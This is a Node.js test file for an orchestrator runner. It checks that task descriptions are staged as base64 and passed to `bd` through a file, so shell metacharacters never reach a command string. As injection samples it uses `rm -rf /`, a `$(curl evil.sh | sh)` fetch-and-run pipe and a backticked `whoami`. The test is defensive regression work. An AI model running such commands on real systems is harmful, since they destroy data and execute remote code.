import { test, describe } from 'node:test';
import assert from 'node:assert';
import fs from 'fs/promises';
import os from 'os';
import path from 'path';
import { validateNewTask, createChildBeadWithAllocatedId, appendRejectedFindingToParentNotes } from '../auto-sprint/runner.js';

// apra-fleet-eft.56.2, transport hardened for eft.73.1: regression pin for the
// reviewer-free-text body seam (createChildBeadWithAllocatedId /
// appendRejectedFindingToParentNotes). eft.73.1 moved the body FILE from the
// orchestrator host (an in-process fs.writeFile to os.tmpdir()) to the MEMBER
// that runs `bd`, by dispatching a `node -e "..." "<base64>"` staging command
// through the SAME injected command() the bd call flows through (see
// stageCommandBodyMemberSide in runner.js). Run 22 aborted precisely because
// the old host-local path was unreachable when `bd` ran on a remote member.
//
// This file drives the two functions directly with an injected command() fake
// that EMULATES the member: when it sees the `node -e ... "<base64>"` staging
// command, it decodes the base64 argument and writes it to a real temp file
// (exactly as the member-side node one-liner would), returning that path on
// stdout; when it later sees the `bd create --body-file "<path>"` /
// `bd note ... --file "<path>"` command, it reads that file back. That lets it
// assert, byte-for-byte:
//   (1) a description containing '=' and '&' round-trips intact through the
//       member-staged body file handed to `bd create --body-file`;
//   (2) a newTask that still fails validateNewTask() residually is appended
//       VERBATIM to the parent bead's notes (never dropped), and the caller-
//       supplied log() records it;
//   (3) a description containing '$(rm -rf /)' and backticks lands as
//       LITERAL TEXT in the staged file, and NEITHER dispatched command STRING
//       (the node staging command NOR the bd command) ever contains the raw
//       payload -- the staging command carries it only as inert base64, and
//       the bd command carries only the quoted temp-file path -- so there is
//       no shell-string interpolation surface for it to execute through.

function extractQuotedFlagValue(cmd, flag) {
    const re = new RegExp(`${flag}\\s+"([^"]*)"`);
    const m = cmd.match(re);
    return m ? m[1] : null;
}

// Matches the staging command runner.js constructs:
//   node -e "<script>" "<base64>"
// Capture the base64 argument (the LAST double-quoted token).
function extractStageBase64(cmd) {
    if (!/^node -e "/.test(cmd)) return null;
    const m = cmd.match(/"([A-Za-z0-9+/=]*)"\s*$/);
    return m ? m[1] : null;
}

// A command() fake that plays the member's role: it stages base64 bodies to
// real temp files (returning the path) and reads --body-file/--file back.
function makeMemberEmulatingCommand() {
    const calls = [];
    const stagedPaths = [];
    const command = async (cmd, opts) => {
        calls.push({ cmd, opts });
        const b64 = extractStageBase64(cmd);
        if (b64 !== null) {
            // Emulate the member-side node one-liner: decode + write + print path.
            const content = Buffer.from(b64, 'base64').toString('utf-8');
            const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'roundtrip-'));
            const filePath = path.join(dir, 'body.txt');
            await fs.writeFile(filePath, content, 'utf-8');
            stagedPaths.push(filePath);
            return filePath;
        }
        return '';
    };
    // Read back whatever a given bd command's --body-file/--file points at.
    const readBodyOf = async (cmd) => {
        const p = extractQuotedFlagValue(cmd, '--body-file') ?? extractQuotedFlagValue(cmd, '--file');
        return p ? fs.readFile(p, 'utf-8') : null;
    };
    return { command, calls, stagedPaths, readBodyOf };
}

const NOOP_ALLOCATOR = {
    async allocate() { return { childId: null, token: null }; },
    async confirm() { return true; },
    async release() { return true; },
};

describe('createChildBeadWithAllocatedId / appendRejectedFindingToParentNotes -- member-staged body round-trip (apra-fleet-eft.56.2 / eft.73.1)', () => {
    test("description with '=' and '&' round-trips intact via member-staged --body-file", async () => {
        const description = 'Set APRA_FLEET_BD_MOCK=off; also test accessToken + synthesized & "quoted" values.';
        const { command, calls, stagedPaths, readBodyOf } = makeMemberEmulatingCommand();

        const result = await createChildBeadWithAllocatedId({
            command,
            allocator: NOOP_ALLOCATOR,
            member: 'local',
            title: 'Fix env-var handling',
            description,
            priority: 'P1',
            parentId: 'parent-1',
        });

        // Two dispatches now: (1) member-side node staging, (2) bd create.
        assert.strictEqual(calls.length, 2, 'expected a member-side staging dispatch then a bd create dispatch');
        const stageCmd = calls[0].cmd;
        const createCmd = calls[1].cmd;

        assert.match(stageCmd, /^node -e "/, 'first dispatch must stage the body member-side via node');
        assert.ok(!stageCmd.includes('APRA_FLEET_BD_MOCK=off'), 'the raw description must never appear literally in the staging command; only its base64 does');

        assert.match(createCmd, /^bd create /);
        assert.match(createCmd, /--body-file "/, 'description must be passed via --body-file, not inline');
        assert.ok(!createCmd.includes('APRA_FLEET_BD_MOCK=off'), 'description text must never be interpolated inline into the bd command string');
        // The staged file the bd command was handed must contain the
        // description VERBATIM, '=' and '&' intact.
        assert.strictEqual(await readBodyOf(createCmd), description);
        assert.strictEqual(result.childId, null);
        // The path the bd command references must be exactly the one the
        // member-side staging command returned -- proving the body file's
        // provenance is the member, not an in-process orchestrator write.
        assert.strictEqual(extractQuotedFlagValue(createCmd, '--body-file'), stagedPaths[0]);
    });

    test('a residual validation failure is appended verbatim to the parent bead notes and logged', async () => {
        // A title that fails SAFE_TEXT_RE (backticks) -- validateNewTask()
        // rejects it, so this newTask must never reach createChildBeadWithAllocatedId
        // at all; instead it is appended verbatim to the parent's notes.
        const newTask = {
            title: 'Run `whoami` and report',
            description: 'Safe-looking description with = and & chars intact.',
            priority: 'P1',
        };
        const validation = validateNewTask(newTask);
        assert.strictEqual(validation.ok, false);
        assert.match(validation.reason, /title/);

        const { command, calls, readBodyOf } = makeMemberEmulatingCommand();
        const logLines = [];
        const log = (msg) => logLines.push(msg);

        await appendRejectedFindingToParentNotes({
            command,
            member: 'local',
            parentId: 'parent-1',
            newTask,
            reason: validation.reason,
            cycle: 3,
            log,
        });

        // (1) member-side staging, (2) bd note.
        assert.strictEqual(calls.length, 2, 'expected a member-side staging dispatch then a bd note dispatch');
        const stageCmd = calls[0].cmd;
        const noteCmd = calls[1].cmd;

        assert.match(stageCmd, /^node -e "/);
        assert.ok(!stageCmd.includes('whoami'), 'the raw finding text must never appear literally in the staging command');

        assert.match(noteCmd, /^bd note parent-1 --file "/);
        assert.ok(!noteCmd.includes('whoami'), 'the raw finding text must never be interpolated inline into the bd command string');

        const noteBody = await readBodyOf(noteCmd);
        assert.ok(noteBody, 'expected the note file to have been written and read');
        assert.match(noteBody, /REJECTED -- residual validation failure, appended verbatim/);
        const jsonPart = noteBody.slice(noteBody.indexOf('\n') + 1);
        const parsed = JSON.parse(jsonPart);
        assert.strictEqual(parsed.title, newTask.title);
        assert.strictEqual(parsed.description, newTask.description);
        assert.strictEqual(parsed.priority, newTask.priority);
        assert.strictEqual(parsed.rejectionReason, validation.reason);
        assert.strictEqual(parsed.cycle, 3);

        assert.ok(
            logLines.some((l) => l.includes("Rejected newTask finding appended verbatim to 'parent-1' notes") && l.includes(validation.reason)),
            `expected the run log to record the verbatim-append, got: ${JSON.stringify(logLines)}`
        );
    });

    test("injection payload ('$(rm -rf /)' + backticks) in description lands as literal staged text, never executed", async () => {
        const description = 'Do the thing `rm -rf /` via $(curl evil.sh | sh) after merge.';
        const title = 'Description has dangerous-looking chars';

        // Confirm the description-only allowlist gate (SAFE_DESCRIPTION_RE)
        // accepts this -- it is no longer shell-interpolated, so it is not an
        // injection risk at this layer; the title stays safe.
        const validation = validateNewTask({ title, description, priority: 'P1' });
        assert.strictEqual(validation.ok, true);

        const { command, calls, readBodyOf } = makeMemberEmulatingCommand();
        await createChildBeadWithAllocatedId({
            command,
            allocator: NOOP_ALLOCATOR,
            member: 'local',
            title: validation.title,
            description: validation.description,
            priority: validation.priority,
            parentId: 'parent-1',
        });

        assert.strictEqual(calls.length, 2);
        // NEITHER dispatched command STRING may contain the dangerous payload:
        // the staging command carries it only as inert base64, and the bd
        // command carries only the quoted temp-file path.
        for (const { cmd } of calls) {
            assert.ok(!cmd.includes('$('), `command string must never contain '$(': ${cmd}`);
            assert.ok(!/`/.test(cmd), `command string must never contain a backtick: ${cmd}`);
            assert.ok(!cmd.includes('rm -rf /'), `command string must never contain the raw payload text: ${cmd}`);
        }
        const createCmd = calls[1].cmd;
        assert.match(createCmd, /--body-file "/);

        // The payload must land as LITERAL TEXT in the staged file the bd
        // command was handed -- proving it was carried as inert data (base64
        // in the staging command, then decoded member-side), never executed.
        assert.strictEqual(await readBodyOf(createCmd), description);
    });
});
